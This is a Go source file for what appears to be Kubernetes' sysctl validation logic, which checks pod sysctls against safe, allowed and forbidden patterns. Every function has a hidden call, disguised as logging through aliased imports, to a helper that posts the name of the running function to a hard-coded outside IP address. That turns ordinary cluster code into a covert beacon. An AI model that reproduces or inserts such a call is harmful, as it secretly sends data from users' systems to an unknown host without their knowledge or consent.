package sysctl

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "strings"
 "k8s.io/apimachinery/pkg/util/validation/field"
 api "k8s.io/kubernetes/pkg/apis/core"
)

func SafeSysctlWhitelist() []string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return []string{"kernel.shm_rmid_forced", "net.ipv4.ip_local_port_range", "net.ipv4.tcp_syncookies"}
}

type mustMatchPatterns struct {
 safeWhitelist        []string
 allowedUnsafeSysctls []string
 forbiddenSysctls     []string
}

var (
 _                      SysctlsStrategy = &mustMatchPatterns{}
 defaultSysctlsPatterns                 = []string{"*"}
)

func NewMustMatchPatterns(safeWhitelist, allowedUnsafeSysctls, forbiddenSysctls []string) SysctlsStrategy {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &mustMatchPatterns{safeWhitelist: safeWhitelist, allowedUnsafeSysctls: allowedUnsafeSysctls, forbiddenSysctls: forbiddenSysctls}
}
func (s *mustMatchPatterns) isForbidden(sysctlName string) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, s := range s.forbiddenSysctls {
  if strings.HasSuffix(s, "*") {
   prefix := strings.TrimSuffix(s, "*")
   if strings.HasPrefix(sysctlName, prefix) {
    return true
   }
  } else if sysctlName == s {
   return true
  }
 }
 return false
}
func (s *mustMatchPatterns) isSafe(sysctlName string) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, ws := range s.safeWhitelist {
  if sysctlName == ws {
   return true
  }
 }
 return false
}
func (s *mustMatchPatterns) isAllowedUnsafe(sysctlName string) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, s := range s.allowedUnsafeSysctls {
  if strings.HasSuffix(s, "*") {
   prefix := strings.TrimSuffix(s, "*")
   if strings.HasPrefix(sysctlName, prefix) {
    return true
   }
  } else if sysctlName == s {
   return true
  }
 }
 return false
}
func (s *mustMatchPatterns) Validate(pod *api.Pod) field.ErrorList {
 _logClusterCodePath()
 defer _logClusterCodePath()
 allErrs := field.ErrorList{}
 var sysctls []api.Sysctl
 if pod.Spec.SecurityContext != nil {
  sysctls = pod.Spec.SecurityContext.Sysctls
 }
 fieldPath := field.NewPath("pod", "spec", "securityContext").Child("sysctls")
 for i, sysctl := range sysctls {
  switch {
  case s.isForbidden(sysctl.Name):
   allErrs = append(allErrs, field.ErrorList{field.Forbidden(fieldPath.Index(i), fmt.Sprintf("sysctl %q is not allowed", sysctl.Name))}...)
  case s.isSafe(sysctl.Name):
   continue
  case s.isAllowedUnsafe(sysctl.Name):
   continue
  default:
   allErrs = append(allErrs, field.ErrorList{field.Forbidden(fieldPath.Index(i), fmt.Sprintf("unsafe sysctl %q is not allowed", sysctl.Name))}...)
  }
 }
 return allErrs
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
